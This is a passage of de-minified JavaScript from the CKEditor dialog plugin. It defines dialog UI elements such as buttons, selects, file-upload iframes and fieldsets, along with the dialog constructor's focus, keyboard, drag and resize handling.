                        }, this);
                        var o = CKEDITOR.tools.extend({}, t);
                        delete o.style;
                        var a = CKEDITOR.tools.getNextId() + "_label";
                        CKEDITOR.ui.dialog.uiElement.call(this, e, o, n, "a", null, {
                            style: t.style,
                            href: "javascript:void(0)",
                            title: t.label,
                            hidefocus: "true",
                            class: t.class,
                            role: "button",
                            "aria-labelledby": a
                        }, '<span id="' + a + '" class="cke_dialog_ui_button">' + CKEDITOR.tools.htmlEncode(t.label) + "</span>");
                    }
                },
                select: function(r, s, e) {
                    if (!(arguments.length < 3)) {
                        var l = c.call(this, s);
                        s.validate && (this.validate = s.validate), l.inputId = CKEDITOR.tools.getNextId() + "_select",
                        CKEDITOR.ui.dialog.labeledElement.call(this, r, s, e, function() {
                            var e = CKEDITOR.tools.extend({}, s, {
                                id: s.id ? s.id + "_select" : CKEDITOR.tools.getNextId() + "_select"
                            }, !0), t = [], n = [], i = {
                                id: l.inputId,
                                class: "cke_dialog_ui_input_select",
                                "aria-labelledby": this._.labelId
                            };
                            t.push('<div class="cke_dialog_ui_input_', s.type, '" role="presentation"'), s.width && t.push('style="width:' + s.width + '" '),
                            t.push(">"), void 0 !== s.size && (i.size = s.size), void 0 !== s.multiple && (i.multiple = s.multiple),
                            g(e);
                            for (var o, a = 0; a < s.items.length && (o = s.items[a]); a++) n.push('<option value="', CKEDITOR.tools.htmlEncode(void 0 !== o[1] ? o[1] : o[0]).replace(/"/g, "&quot;"), '" /> ', CKEDITOR.tools.htmlEncode(o[0]));
                            return void 0 !== e.inputStyle && (e.style = e.inputStyle), l.select = new CKEDITOR.ui.dialog.uiElement(r, e, t, "select", null, i, n.join("")),
                            t.push("</div>"), t.join("");
                        });
                    }
                },
                file: function(e, t, n) {
                    if (!(arguments.length < 3)) {
                        void 0 === t.default && (t.default = "");
                        var i = CKEDITOR.tools.extend(c.call(this, t), {
                            definition: t,
                            buttons: []
                        });
                        t.validate && (this.validate = t.validate), e.on("load", function() {
                            CKEDITOR.document.getById(i.frameId).getParent().addClass("cke_dialog_ui_input_file");
                        }), CKEDITOR.ui.dialog.labeledElement.call(this, e, t, n, function() {
                            i.frameId = CKEDITOR.tools.getNextId() + "_fileInput";
                            var e = [ '<iframe frameborder="0" allowtransparency="0" class="cke_dialog_ui_input_file" role="presentation" id="', i.frameId, '" title="', t.label, '" src="javascript:void(' ];
                            return e.push(CKEDITOR.env.ie ? "(function(){" + encodeURIComponent("document.open();(" + CKEDITOR.tools.fixDomain + ")();document.close();") + "})()" : "0"),
                            e.push(')"></iframe>'), e.join("");
                        });
                    }
                },
                fileButton: function(n, i, e) {
                    var t = this;
                    if (!(arguments.length < 3)) {
                        c.call(this, i), i.validate && (this.validate = i.validate);
                        var o = CKEDITOR.tools.extend({}, i), a = o.onClick;
                        o.className = (o.className ? o.className + " " : "") + "cke_dialog_ui_button", o.onClick = function(e) {
                            var t = i.for;
                            a && !1 === a.call(this, e) || (n.getContentElement(t[0], t[1]).submit(), this.disable());
                        }, n.on("load", function() {
                            n.getContentElement(i.for[0], i.for[1])._.buttons.push(t);
                        }), CKEDITOR.ui.dialog.button.call(this, n, o, e);
                    }
                },
                html: (s = /\/$/, function(e, t, n) {
                    if (!(arguments.length < 3)) {
                        var i = [], o = t.html;
                        "<" != o.charAt(0) && (o = "<span>" + o + "</span>");
                        var a = t.focus;
                        if (a) {
                            var r = this.focus;
                            this.focus = function() {
                                ("function" == typeof a ? a : r).call(this), this.fire("focus");
                            }, t.isFocusable && (this.isFocusable = this.isFocusable), this.keyboardFocusable = !0;
                        }
                        CKEDITOR.ui.dialog.uiElement.call(this, e, t, i, "span", null, null, ""), i = i.join("").match(/^\s*<[\w:]+\s+([^>]*)?>/),
                        o = o.match(/^(\s*<[\w:]+(?:\s+[^>]*)?)((?:.|\r|\n)+)$/) || [ "", "", "" ], s.test(o[1]) && (o[1] = o[1].slice(0, -1),
                        o[2] = "/" + o[2]), n.push([ o[1], " ", i[1] || "", o[2] ].join(""));
                    }
                }),
                fieldset: function(e, t, n, i, o) {
                    var a = o.label;
                    this._ = {
                        children: t
                    }, CKEDITOR.ui.dialog.uiElement.call(this, e, o, i, "fieldset", null, null, function() {
                        var e = [];
                        a && e.push("<legend" + (o.labelStyle ? ' style="' + o.labelStyle + '"' : "") + ">" + a + "</legend>");
                        for (var t = 0; t < n.length; t++) e.push(n[t]);
                        return e.join("");
                    });
                }
            }, !0), CKEDITOR.ui.dialog.html.prototype = new CKEDITOR.ui.dialog.uiElement(),
            CKEDITOR.ui.dialog.labeledElement.prototype = CKEDITOR.tools.extend(new CKEDITOR.ui.dialog.uiElement(), {
                setLabel: function(e) {
                    var t = CKEDITOR.document.getById(this._.labelId);
                    return t.getChildCount() < 1 ? new CKEDITOR.dom.text(e, CKEDITOR.document).appendTo(t) : t.getChild(0).$.nodeValue = e,
                    this;
                },
                getLabel: function() {
                    var e = CKEDITOR.document.getById(this._.labelId);
                    return !e || e.getChildCount() < 1 ? "" : e.getChild(0).getText();
                },
                eventProcessors: i
            }, !0), CKEDITOR.ui.dialog.button.prototype = CKEDITOR.tools.extend(new CKEDITOR.ui.dialog.uiElement(), {
                click: function() {
                    return !this._.disabled && this.fire("click", {
                        dialog: this._.dialog
                    });
                },
                enable: function() {
                    this._.disabled = !1;
                    var e = this.getElement();
                    e && e.removeClass("cke_disabled");
                },
                disable: function() {
                    this._.disabled = !0, this.getElement().addClass("cke_disabled");
                },
                isVisible: function() {
                    return this.getElement().getFirst().isVisible();
                },
                isEnabled: function() {
                    return !this._.disabled;
                },
                eventProcessors: CKEDITOR.tools.extend({}, CKEDITOR.ui.dialog.uiElement.prototype.eventProcessors, {
                    onClick: function(e, t) {
                        this.on("click", function() {
                            t.apply(this, arguments);
                        });
                    }
                }, !0),
                accessKeyUp: function() {
                    this.click();
                },
                accessKeyDown: function() {
                    this.focus();
                },
                keyboardFocusable: !0
            }, !0), CKEDITOR.ui.dialog.textInput.prototype = CKEDITOR.tools.extend(new CKEDITOR.ui.dialog.labeledElement(), {
                getInputElement: function() {
                    return CKEDITOR.document.getById(this._.inputId);
                },
                focus: function() {
                    var t = this.selectParentTab();
                    setTimeout(function() {
                        var e = t.getInputElement();
                        e && e.$.focus();
                    }, 0);
                },
                select: function() {
                    var t = this.selectParentTab();
                    setTimeout(function() {
                        var e = t.getInputElement();
                        e && (e.$.focus(), e.$.select());
                    }, 0);
                },
                accessKeyUp: function() {
                    this.select();
                },
                setValue: function(e) {
                    return !e && (e = ""), CKEDITOR.ui.dialog.uiElement.prototype.setValue.apply(this, arguments);
                },
                keyboardFocusable: !0
            }, n, !0), CKEDITOR.ui.dialog.textarea.prototype = new CKEDITOR.ui.dialog.textInput(),
            CKEDITOR.ui.dialog.select.prototype = CKEDITOR.tools.extend(new CKEDITOR.ui.dialog.labeledElement(), {
                getInputElement: function() {
                    return this._.select.getElement();
                },
                add: function(e, t, n) {
                    var i = new CKEDITOR.dom.element("option", this.getDialog().getParentEditor().document), o = this.getInputElement().$;
                    return i.$.text = e, i.$.value = null == t ? e : t, null == n ? CKEDITOR.env.ie ? o.add(i.$) : o.add(i.$, null) : o.add(i.$, n),
                    this;
                },
                remove: function(e) {
                    return this.getInputElement().$.remove(e), this;
                },
                clear: function() {
                    for (var e = this.getInputElement().$; 0 < e.length; ) e.remove(0);
                    return this;
                },
                keyboardFocusable: !0
            }, n, !0), CKEDITOR.ui.dialog.checkbox.prototype = CKEDITOR.tools.extend(new CKEDITOR.ui.dialog.uiElement(), {
                getInputElement: function() {
                    return this._.checkbox.getElement();
                },
                setValue: function(e, t) {
                    this.getInputElement().$.checked = e, !t && this.fire("change", {
                        value: e
                    });
                },
                getValue: function() {
                    return this.getInputElement().$.checked;
                },
                accessKeyUp: function() {
                    this.setValue(!this.getValue());
                },
                eventProcessors: {
                    onChange: function(e, t) {
                        return !CKEDITOR.env.ie || 8 < CKEDITOR.env.version ? i.onChange.apply(this, arguments) : (e.on("load", function() {
                            var t = this._.checkbox.getElement();
                            t.on("propertychange", function(e) {
                                "checked" == (e = e.data.$).propertyName && this.fire("change", {
                                    value: t.$.checked
                                });
                            }, this);
                        }, this), this.on("change", t), null);
                    }
                },
                keyboardFocusable: !0
            }, n, !0), CKEDITOR.ui.dialog.radio.prototype = CKEDITOR.tools.extend(new CKEDITOR.ui.dialog.uiElement(), {
                setValue: function(e, t) {
                    for (var n, i = this._.children, o = 0; o < i.length && (n = i[o]); o++) n.getElement().$.checked = n.getValue() == e;
                    !t && this.fire("change", {
                        value: e
                    });
                },
                getValue: function() {
                    for (var e = this._.children, t = 0; t < e.length; t++) if (e[t].getElement().$.checked) return e[t].getValue();
                    return null;
                },
                accessKeyUp: function() {
                    var e, t = this._.children;
                    for (e = 0; e < t.length; e++) if (t[e].getElement().$.checked) return void t[e].getElement().focus();
                    t[0].getElement().focus();
                },
                eventProcessors: {
                    onChange: function(e, t) {
                        return CKEDITOR.env.ie ? (e.on("load", function() {
                            for (var e = this._.children, t = this, n = 0; n < e.length; n++) e[n].getElement().on("propertychange", function(e) {
                                "checked" == (e = e.data.$).propertyName && this.$.checked && t.fire("change", {
                                    value: this.getAttribute("value")
                                });
                            });
                        }, this), this.on("change", t), null) : i.onChange.apply(this, arguments);
                    }
                }
            }, n, !0), CKEDITOR.ui.dialog.file.prototype = CKEDITOR.tools.extend(new CKEDITOR.ui.dialog.labeledElement(), n, {
                getInputElement: function() {
                    var e = CKEDITOR.document.getById(this._.frameId).getFrameDocument();
                    return 0 < e.$.forms.length ? new CKEDITOR.dom.element(e.$.forms[0].elements[0]) : this.getElement();
                },
                submit: function() {
                    return this.getInputElement().getParent().$.submit(), this;
                },
                getAction: function() {
                    return this.getInputElement().getParent().$.action;
                },
                registerEvents: function(e) {
                    var t, n;
                    for (n in e) (t = n.match(/^on([A-Z]\w+)/)) && (this.eventProcessors[n] ? this.eventProcessors[n].call(this, this._.dialog, e[n]) : function(e, t, n, i) {
                        e.on("formLoaded", function() {
                            e.getInputElement().on(n, i, e);
                        });
                    }(this, this._.dialog, t[1].toLowerCase(), e[n]));
                    return this;
                },
                reset: function() {
                    function e() {
                        i.$.open();
                        var e = "";
                        o.size && (e = o.size - (CKEDITOR.env.ie ? 7 : 0));
                        var t = n.frameId + "_input";
                        for (i.$.write([ '<html dir="' + l + '" lang="' + c + '"><head><title></title></head><body style="margin: 0; overflow: hidden; background: transparent;">', '<form enctype="multipart/form-data" method="POST" dir="' + l + '" lang="' + c + '" action="', CKEDITOR.tools.htmlEncode(o.action), '"><label id="', n.labelId, '" for="', t, '" style="display:none">', CKEDITOR.tools.htmlEncode(o.label), '</label><input style="width:100%" id="', t, '" aria-labelledby="', n.labelId, '" type="file" name="', CKEDITOR.tools.htmlEncode(o.id || "cke_upload"), '" size="', CKEDITOR.tools.htmlEncode(0 < e ? e : ""), '" /></form></body></html><script>', CKEDITOR.env.ie ? "(" + CKEDITOR.tools.fixDomain + ")();" : "", "window.parent.CKEDITOR.tools.callFunction(" + r + ");", "window.onbeforeunload = function() {window.parent.CKEDITOR.tools.callFunction(" + s + ")}", "<\/script>" ].join("")),
                        i.$.close(), e = 0; e < a.length; e++) a[e].enable();
                    }
                    var n = this._, i = CKEDITOR.document.getById(n.frameId).getFrameDocument(), o = n.definition, a = n.buttons, r = this.formLoadedNumber, s = this.formUnloadNumber, l = n.dialog._.editor.lang.dir, c = n.dialog._.editor.langCode;
                    r || (r = this.formLoadedNumber = CKEDITOR.tools.addFunction(function() {
                        this.fire("formLoaded");
                    }, this), s = this.formUnloadNumber = CKEDITOR.tools.addFunction(function() {
                        this.getInputElement().clearCustomData();
                    }, this), this.getDialog()._.editor.on("destroy", function() {
                        CKEDITOR.tools.removeFunction(r), CKEDITOR.tools.removeFunction(s);
                    })), CKEDITOR.env.gecko ? setTimeout(e, 500) : e();
                },
                getValue: function() {
                    return this.getInputElement().$.value || "";
                },
                setInitValue: function() {
                    this._.initValue = "";
                },
                eventProcessors: {
                    onChange: function(e, t) {
                        this._.domOnChangeRegistered || (this.on("formLoaded", function() {
                            this.getInputElement().on("change", function() {
                                this.fire("change", {
                                    value: this.getValue()
                                });
                            }, this);
                        }, this), this._.domOnChangeRegistered = !0), this.on("change", t);
                    }
                },
                keyboardFocusable: !0
            }, !0), CKEDITOR.ui.dialog.fileButton.prototype = new CKEDITOR.ui.dialog.button(),
            CKEDITOR.ui.dialog.fieldset.prototype = CKEDITOR.tools.clone(CKEDITOR.ui.dialog.hbox.prototype),
            CKEDITOR.dialog.addUIElement("text", e), CKEDITOR.dialog.addUIElement("password", e),
            CKEDITOR.dialog.addUIElement("textarea", t), CKEDITOR.dialog.addUIElement("checkbox", t),
            CKEDITOR.dialog.addUIElement("radio", t), CKEDITOR.dialog.addUIElement("button", t),
            CKEDITOR.dialog.addUIElement("select", t), CKEDITOR.dialog.addUIElement("file", t),
            CKEDITOR.dialog.addUIElement("fileButton", t), CKEDITOR.dialog.addUIElement("html", t),
            CKEDITOR.dialog.addUIElement("fieldset", {
                build: function(e, t, n) {
                    for (var i, o = t.children, a = [], r = [], s = 0; s < o.length && (i = o[s]); s++) {
                        var l = [];
                        a.push(l), r.push(CKEDITOR.dialog._.uiElementBuilders[i.type].build(e, i, l));
                    }
                    return new CKEDITOR.ui.dialog[t.type](e, r, a, n, t);
                }
            });
        }
    }), CKEDITOR.DIALOG_RESIZE_NONE = 0, CKEDITOR.DIALOG_RESIZE_WIDTH = 1, CKEDITOR.DIALOG_RESIZE_HEIGHT = 2,
    CKEDITOR.DIALOG_RESIZE_BOTH = 3, function() {
        function E() {
            for (var e = this._.tabIdList.length, t = CKEDITOR.tools.indexOf(this._.tabIdList, this._.currentTabId) + e, n = t - 1; t - e < n; n--) if (this._.tabs[this._.tabIdList[n % e]][0].$.offsetHeight) return this._.tabIdList[n % e];
            return null;
        }
        function p() {
            for (var e = this._.tabIdList.length, t = CKEDITOR.tools.indexOf(this._.tabIdList, this._.currentTabId), n = t + 1; n < t + e; n++) if (this._.tabs[this._.tabIdList[n % e]][0].$.offsetHeight) return this._.tabIdList[n % e];
            return null;
        }
        function a(e, t) {
            for (var n = e.$.getElementsByTagName("input"), i = 0, o = n.length; i < o; i++) {
                var a = new CKEDITOR.dom.element(n[i]);
                "text" == a.getAttribute("type").toLowerCase() && (t ? (a.setAttribute("value", a.getCustomData("fake_value") || ""),
                a.removeCustomData("fake_value")) : (a.setCustomData("fake_value", a.getAttribute("value")),
                a.setAttribute("value", "")));
            }
        }
        function i(e, t, n) {
            this.element = t, this.focusIndex = n, this.tabIndex = 0, this.isFocusable = function() {
                return !t.getAttribute("disabled") && t.isVisible();
            }, this.focus = function() {
                e._.currentFocusIndex = this.focusIndex, this.element.focus();
            }, t.on("keydown", function(e) {
                e.data.getKeystroke() in {
                    32: 1,
                    13: 1
                } && this.fire("click");
            }), t.on("focus", function() {
                this.fire("mouseover");
            }), t.on("blur", function() {
                this.fire("mouseout");
            });
        }
        function r(e, t) {
            this._ = {
                dialog: e
            }, CKEDITOR.tools.extend(this, t);
        }
        function c(e) {
            e.data.preventDefault(1);
        }
        function l(e) {
            var n = CKEDITOR.document.getWindow(), t = (a = e.config).dialog_backgroundCoverColor || "white", i = a.dialog_backgroundCoverOpacity, o = a.baseFloatZIndex, a = CKEDITOR.tools.genKey(t, i, o), r = v[a];
            r ? r.show() : (o = [ '<div tabIndex="-1" style="position: ', CKEDITOR.env.ie6Compat ? "absolute" : "fixed", "; z-index: ", o, "; top: 0px; left: 0px; ", CKEDITOR.env.ie6Compat ? "" : "background-color: " + t, '" class="cke_dialog_background_cover">' ],
            CKEDITOR.env.ie6Compat && (t = "<html><body style=\\'background-color:" + t + ";\\'></body></html>",
            o.push('<iframe hidefocus="true" frameborder="0" id="cke_dialog_background_iframe" src="javascript:'),
            o.push("void((function(){" + encodeURIComponent("document.open();(" + CKEDITOR.tools.fixDomain + ")();document.write( '" + t + "' );document.close();") + "})())"),
            o.push('" style="position:absolute;left:0;top:0;width:100%;height: 100%;filter: progid:DXImageTransform.Microsoft.Alpha(opacity=0)"></iframe>')),
            o.push("</div>"), (r = CKEDITOR.dom.element.createFromHtml(o.join(""))).setOpacity(void 0 !== i ? i : .5),
            r.on("keydown", c), r.on("keypress", c), r.on("keyup", c), r.appendTo(CKEDITOR.document.getBody()),
            v[a] = r), e.focusManager.add(r), O = r;
            var s = function() {
                var e = n.getScrollPosition(), t = CKEDITOR.dialog._.currentTop;
                if (r.setStyles({
                    left: e.x + "px",
                    top: e.y + "px"
                }), t) for (;e = t.getPosition(), t.move(e.x, e.y), t = t._.parentDialog; ) ;
            };
            if (m = e = function() {
                var e = n.getViewPaneSize();
                r.setStyles({
                    width: e.width + "px",
                    height: e.height + "px"
                });
            }, n.on("resize", e), e(), (!CKEDITOR.env.mac || !CKEDITOR.env.webkit) && r.focus(),
            CKEDITOR.env.ie6Compat) {
                var l = function() {
                    s(), arguments.callee.prevScrollHandler.apply(this, arguments);
                };
                n.$.setTimeout(function() {
                    l.prevScrollHandler = window.onscroll || function() {}, window.onscroll = l;
                }, 0), s();
            }
        }
        function o(e) {
            O && (e.focusManager.remove(O), e = CKEDITOR.document.getWindow(), O.hide(), e.removeListener("resize", m),
            CKEDITOR.env.ie6Compat && e.$.setTimeout(function() {
                window.onscroll = window.onscroll && window.onscroll.prevScrollHandler || null;
            }, 0), m = null);
        }
        var n, s, e, d = CKEDITOR.tools.cssLength, T = '<div class="cke_reset_all {editorId} {editorDialogClass} {hidpi}" dir="{langDir}" lang="{langCode}" role="dialog" aria-labelledby="cke_dialog_title_{id}"><table class="cke_dialog ' + CKEDITOR.env.cssClass + ' cke_{langDir}" style="position:absolute" role="presentation"><tr><td role="presentation"><div class="cke_dialog_body" role="presentation"><div id="cke_dialog_title_{id}" class="cke_dialog_title" role="presentation"></div><a id="cke_dialog_close_button_{id}" class="cke_dialog_close_button" href="javascript:void(0)" title="{closeTitle}" role="button"><span class="cke_label">X</span></a><div id="cke_dialog_tabs_{id}" class="cke_dialog_tabs" role="tablist"></div><table class="cke_dialog_contents" role="presentation"><tr><td id="cke_dialog_contents_{id}" class="cke_dialog_contents_body" role="presentation"></td></tr><tr><td id="cke_dialog_footer_{id}" class="cke_dialog_footer" role="presentation"></td></tr></table></div></td></tr></table></div>';
        CKEDITOR.dialog = function(i, e) {
            function o(e) {
                var t = f._.focusList;
                if (e = e || 0, !(t.length < 1)) {
                    var n = f._.currentFocusIndex;
                    try {
                        t[n].getInputElement().$.blur();
                    } catch (e) {}
                    for (var i = n = (n + e + t.length) % t.length; e && !t[i].isFocusable() && (i = (i + e + t.length) % t.length) != n; ) ;
                    t[i].focus(), "text" == t[i].type && t[i].select();
                }
            }
            function t(e) {
                if (f == CKEDITOR.dialog._.currentTop) {
                    var t = e.data.getKeystroke(), n = "rtl" == i.lang.dir;
                    if (r = s = 0, 9 == t || t == CKEDITOR.SHIFT + 9) t = t == CKEDITOR.SHIFT + 9, f._.tabBarMode ? (t = t ? E.call(f) : p.call(f),
                    f.selectPage(t), f._.tabs[t][0].focus()) : o(t ? -1 : 1), r = 1; else if (t == CKEDITOR.ALT + 121 && !f._.tabBarMode && 1 < f.getPageCount()) f._.tabBarMode = !0,
                    f._.tabs[f._.currentTabId][0].focus(), r = 1; else if (37 != t && 39 != t || !f._.tabBarMode) if (13 != t && 32 != t || !f._.tabBarMode) if (13 == t) (t = e.data.getTarget()).is("a", "button", "select", "textarea") || t.is("input") && "button" == t.$.type || ((t = this.getButton("ok")) && CKEDITOR.tools.setTimeout(t.click, 0, t),
                    r = 1), s = 1; else {
                        if (27 != t) return;
                        (t = this.getButton("cancel")) ? CKEDITOR.tools.setTimeout(t.click, 0, t) : !1 !== this.fire("cancel", {
                            hide: !0
                        }).hide && this.hide(), s = 1;
                    } else this.selectPage(this._.currentTabId), this._.tabBarMode = !1, this._.currentFocusIndex = -1,
                    o(1), r = 1; else t = t == (n ? 39 : 37) ? E.call(f) : p.call(f), f.selectPage(t),
                    f._.tabs[t][0].focus(), r = 1;
                    a(e);
                }
            }
            function a(e) {
                r ? e.data.preventDefault(1) : s && e.data.stopPropagation();
            }
            var r, s, n = CKEDITOR.dialog._.dialogDefinitions[e], l = CKEDITOR.tools.clone(C), c = i.config.dialog_buttonsOrder || "OS", d = i.lang.dir, u = {};
            if (("OS" == c && CKEDITOR.env.mac || "rtl" == c && "ltr" == d || "ltr" == c && "rtl" == d) && l.buttons.reverse(),
            n = CKEDITOR.tools.extend(n(i), l), n = CKEDITOR.tools.clone(n), n = new I(this, n),
            l = function(e) {
                var t = (e = CKEDITOR.dom.element.createFromHtml(CKEDITOR.addTemplate("dialog", T).output({
                    id: CKEDITOR.tools.getNextNumber(),
                    editorId: e.id,
                    langDir: e.lang.dir,
                    langCode: e.langCode,
                    editorDialogClass: "cke_editor_" + e.name.replace(/\./g, "\\.") + "_dialog",
                    closeTitle: e.lang.common.close,
                    hidpi: CKEDITOR.env.hidpi ? "cke_hidpi" : ""
                }))).getChild([ 0, 0, 0, 0, 0 ]), n = t.getChild(0), i = t.getChild(1);
                if (CKEDITOR.env.ie && !CKEDITOR.env.quirks) {
                    var o = "javascript:void(function(){" + encodeURIComponent("document.open();(" + CKEDITOR.tools.fixDomain + ")();document.close();") + "}())";
                    CKEDITOR.dom.element.createFromHtml('<iframe frameBorder="0" class="cke_iframe_shim" src="' + o + '" tabIndex="-1"></iframe>').appendTo(t.getParent());
                }
                return n.unselectable(), i.unselectable(), {
                    element: e,
                    parts: {
                        dialog: e.getChild(0),
                        title: n,
                        close: i,
                        tabs: t.getChild(2),
                        contents: t.getChild([ 3, 0, 0, 0 ]),
                        footer: t.getChild([ 3, 0, 1, 0 ])
                    }
                };
            }(i), this._ = {
                editor: i,
                element: l.element,
                name: e,
                contentSize: {
                    width: 0,
                    height: 0
                },
                size: {
                    width: 0,
                    height: 0
                },
                contents: {},
                buttons: {},
                accessKeyMap: {},
                tabs: {},
                tabIdList: [],
                currentTabId: null,
                currentTabIndex: null,
                pageCount: 0,
                lastTab: null,
                tabBarMode: !1,
                focusList: [],
                currentFocusIndex: 0,
                hasFocus: !1
            }, this.parts = l.parts, CKEDITOR.tools.setTimeout(function() {
                i.fire("ariaWidget", this.parts.contents);
            }, 0, this), (l = {
                position: CKEDITOR.env.ie6Compat ? "absolute" : "fixed",
                top: 0,
                visibility: "hidden"
            })["rtl" == d ? "right" : "left"] = 0, this.parts.dialog.setStyles(l), CKEDITOR.event.call(this),
            this.definition = n = CKEDITOR.fire("dialogDefinition", {
                name: e,
                definition: n
            }, i).definition, !("removeDialogTabs" in i._) && i.config.removeDialogTabs) {
                for (l = i.config.removeDialogTabs.split(";"), d = 0; d < l.length; d++) if (2 == (c = l[d].split(":")).length) {
                    var h = c[0];
                    u[h] || (u[h] = []), u[h].push(c[1]);
                }
                i._.removeDialogTabs = u;
            }
            if (i._.removeDialogTabs && (u = i._.removeDialogTabs[e])) for (d = 0; d < u.length; d++) n.removeContents(u[d]);
            n.onLoad && this.on("load", n.onLoad), n.onShow && this.on("show", n.onShow), n.onHide && this.on("hide", n.onHide),
            n.onOk && this.on("ok", function(e) {
                i.fire("saveSnapshot"), setTimeout(function() {
                    i.fire("saveSnapshot");
                }, 0), !1 === n.onOk.call(this, e) && (e.data.hide = !1);
            }), n.onCancel && this.on("cancel", function(e) {
                !1 === n.onCancel.call(this, e) && (e.data.hide = !1);
            });
            var f = this, m = function(e) {
                var t, n = f._.contents;
                for (t in n) for (var i in n[t]) if (e.call(this, n[t][i])) return;
            };
            this.on("ok", function(i) {
                m(function(e) {
                    if (e.validate) {
                        var t = e.validate(this), n = "string" == typeof t || !1 === t;
                        return n && (i.data.hide = !1, i.stop()), function(e, t) {
                            var n = this.getInputElement();
                            n && (e ? n.removeAttribute("aria-invalid") : n.setAttribute("aria-invalid", !0)),
                            e || (this.select ? this.select() : this.focus()), t && alert(t), this.fire("validated", {
                                valid: e,
                                msg: t
                            });
                        }.call(e, !n, "string" == typeof t ? t : void 0), n;
                    }
                });
            }, this, null, 0), this.on("cancel", function(t) {
                m(function(e) {
                    if (e.isChanged()) return !i.config.dialog_noConfirmCancel && !confirm(i.lang.common.confirmCancel) && (t.data.hide = !1),
                    !0;
                });
            }, this, null, 0), this.parts.close.on("click", function(e) {
                !1 !== this.fire("cancel", {
                    hide: !0
                }).hide && this.hide(), e.data.preventDefault();
            }, this), this.changeFocus = o;
            var g = this._.element;
            for (i.focusManager.add(g, 1), this.on("show", function() {
                g.on("keydown", t, this), CKEDITOR.env.gecko && g.on("keypress", a, this);
            }), this.on("hide", function() {
                g.removeListener("keydown", t), CKEDITOR.env.gecko && g.removeListener("keypress", a),
                m(function(e) {
                    (function() {
                        var e = this.getInputElement();
                        e && e.removeAttribute("aria-invalid");
                    }).apply(e);
                });
            }), this.on("iframeAdded", function(e) {
                new CKEDITOR.dom.document(e.data.iframe.$.contentWindow.document).on("keydown", t, this, null, 0);
            }), this.on("show", function() {
                if (function() {
                    var e = f._.focusList;
                    e.sort(function(e, t) {
                        return e.tabIndex != t.tabIndex ? t.tabIndex - e.tabIndex : e.focusIndex - t.focusIndex;
                    });
                    for (var t = e.length, n = 0; n < t; n++) e[n].focusIndex = n;
                }(), i.config.dialog_startupFocusTab && 1 < f._.pageCount) f._.tabBarMode = !0,
                f._.tabs[f._.currentTabId][0].focus(); else if (!this._.hasFocus) if (this._.currentFocusIndex = -1,
                n.onFocus) {
                    var e = n.onFocus.call(this);
                    e && e.focus();
                } else o(1);
            }, this, null, 4294967295), CKEDITOR.env.ie6Compat && this.on("load", function() {
                var e = this.getElement(), t = e.getFirst();
                t.remove(), t.appendTo(e);
            }, this), function(s) {
                function n(e) {
                    var t = s.getSize(), n = CKEDITOR.document.getWindow().getViewPaneSize(), i = e.data.$.screenX, o = e.data.$.screenY, a = i - l.x, r = o - l.y;
                    l = {
                        x: i,
                        y: o
                    }, c.x += a, c.y += r, s.move(c.x + h[3] < u ? -h[3] : c.x - h[1] > n.width - t.width - u ? n.width - t.width + ("rtl" == d.lang.dir ? 0 : h[1]) : c.x, c.y + h[0] < u ? -h[0] : c.y - h[2] > n.height - t.height - u ? n.height - t.height + h[2] : c.y, 1),
                    e.data.preventDefault();
                }
                function i() {
                    if (CKEDITOR.document.removeListener("mousemove", n), CKEDITOR.document.removeListener("mouseup", i),
                    CKEDITOR.env.ie6Compat) {
                        var e = O.getChild(0).getFrameDocument();
                        e.removeListener("mousemove", n), e.removeListener("mouseup", i);
                    }
                }
                var l = null, c = null, d = s.getParentEditor(), u = d.config.dialog_magnetDistance, h = CKEDITOR.skin.margins || [ 0, 0, 0, 0 ];
                void 0 === u && (u = 20), s.parts.title.on("mousedown", function(e) {
                    if (l = {
                        x: e.data.$.screenX,
                        y: e.data.$.screenY
                    }, CKEDITOR.document.on("mousemove", n), CKEDITOR.document.on("mouseup", i), c = s.getPosition(),
                    CKEDITOR.env.ie6Compat) {
                        var t = O.getChild(0).getFrameDocument();
                        t.on("mousemove", n), t.on("mouseup", i);
                    }
                    e.data.preventDefault();
                }, s);
            }(this), function(l) {
                function n(e) {
                    var t = "rtl" == p.lang.dir, n = E.width, i = E.height, o = n + (e.data.$.screenX - c) * (t ? -1 : 1) * (l._.moved ? 1 : 2), a = i + (e.data.$.screenY - d) * (l._.moved ? 1 : 2), r = l._.element.getFirst(), s = (r = t && r.getComputedStyle("right"),
                    l.getPosition());
                    s.y + a > g.height && (a = g.height - s.y), (t ? r : s.x) + o > g.width && (o = g.width - (t ? r : s.x)),
                    h != CKEDITOR.DIALOG_RESIZE_WIDTH && h != CKEDITOR.DIALOG_RESIZE_BOTH || (n = Math.max(u.minWidth || 0, o - f)),
                    h != CKEDITOR.DIALOG_RESIZE_HEIGHT && h != CKEDITOR.DIALOG_RESIZE_BOTH || (i = Math.max(u.minHeight || 0, a - m)),
                    l.resize(n, i), l._.moved || l.layout(), e.data.preventDefault();
                }
                function i() {
                    if (CKEDITOR.document.removeListener("mouseup", i), CKEDITOR.document.removeListener("mousemove", n),
                    o && (o.remove(), o = null), CKEDITOR.env.ie6Compat) {
                        var e = O.getChild(0).getFrameDocument();
                        e.removeListener("mouseup", i), e.removeListener("mousemove", n);
                    }
                }
                var c, d, u = l.definition, h = u.resizable;
                if (h != CKEDITOR.DIALOG_RESIZE_NONE) {
                    var f, m, g, E, o, p = l.getParentEditor(), t = CKEDITOR.tools.addFunction(function(e) {
                        E = l.getSize();
                        var t = l.parts.contents;
                        t.$.getElementsByTagName("iframe").length && (o = CKEDITOR.dom.element.createFromHtml('<div class="cke_dialog_resize_cover" style="height: 100%; position: absolute; width: 100%;"></div>'),
                        t.append(o)), m = E.height - l.parts.contents.getSize("height", !(CKEDITOR.env.gecko || CKEDITOR.env.ie && CKEDITOR.env.quirks)),
                        f = E.width - l.parts.contents.getSize("width", 1), c = e.screenX, d = e.screenY,
                        g = CKEDITOR.document.getWindow().getViewPaneSize(), CKEDITOR.document.on("mousemove", n),
                        CKEDITOR.document.on("mouseup", i), CKEDITOR.env.ie6Compat && ((t = O.getChild(0).getFrameDocument()).on("mousemove", n),
                        t.on("mouseup", i)), e.preventDefault && e.preventDefault();
                    });
                    l.on("load", function() {
                        var e = "";
                        h == CKEDITOR.DIALOG_RESIZE_WIDTH ? e = " cke_resizer_horizontal" : h == CKEDITOR.DIALOG_RESIZE_HEIGHT && (e = " cke_resizer_vertical"),
